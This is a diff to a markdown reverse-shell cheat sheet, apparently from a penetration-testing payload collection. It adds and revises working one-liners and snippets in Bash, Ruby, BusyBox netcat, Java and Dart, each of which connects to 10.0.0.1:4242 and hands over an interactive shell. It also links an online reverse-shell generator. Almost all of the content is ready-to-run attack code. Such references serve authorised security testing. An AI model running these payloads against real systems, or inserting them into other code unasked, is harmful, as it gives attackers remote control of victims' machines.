@@ -4,9 +4,11 @@
 
 * [Reverse Shell](#reverse-shell)
     * [Awk](#awk)
+    * [Automatic Reverse Shell Generator](#revshells)
     * [Bash TCP](#bash-tcp)
     * [Bash UDP](#bash-udp)
     * [C](#c)
+    * [Dart](#dart)
     * [Golang](#golang)
     * [Groovy Alternative 1](#groovy-alternative-1)
     * [Groovy](#groovy)
@@ -16,6 +18,7 @@
     * [Lua](#lua)
     * [Ncat](#ncat)
     * [Netcat OpenBsd](#netcat-openbsd)
+    * [Netcat BusyBox](#netcat-busybox)
     * [Netcat Traditional](#netcat-traditional)
     * [NodeJS](#nodejs)
     * [OpenSSL](#openssl)
@@ -43,6 +46,8 @@
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 
 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+
+/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
 ```
 
 ### Bash UDP
@@ -130,7 +135,7 @@ php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>
 ```ruby
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
-ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
 
 NOTE: Windows only
 ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -154,6 +159,12 @@ nc -c bash 10.0.0.1 4242
 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+
+### Netcat BusyBox
+
+```bash
+rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 ```
 
 ### Ncat
@@ -209,9 +220,9 @@ awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& 
 ### Java
 
 ```java
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
+Runtime r = Runtime.getRuntime();
+Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
+p.waitFor();
 
 ```
 
@@ -345,6 +356,35 @@ int main(void){
     return 0;       
 }
 ```
+
+### Dart
+
+```java
+import 'dart:io';
+import 'dart:convert';
+
+main() {
+  Socket.connect("10.0.0.1", 4242).then((socket) {
+    socket.listen((data) {
+      Process.start('powershell.exe', []).then((Process process) {
+        process.stdin.writeln(new String.fromCharCodes(data).trim());
+        process.stdout
+          .transform(utf8.decoder)
+          .listen((output) { socket.write(output); });
+      });
+    },
+    onDone: () {
+      socket.destroy();
+    });
+  });
+}
+```
+
+## RevShells
+
+https://www.revshells.com/
+![image](https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png)
+
 
 ## Meterpreter Shell
 
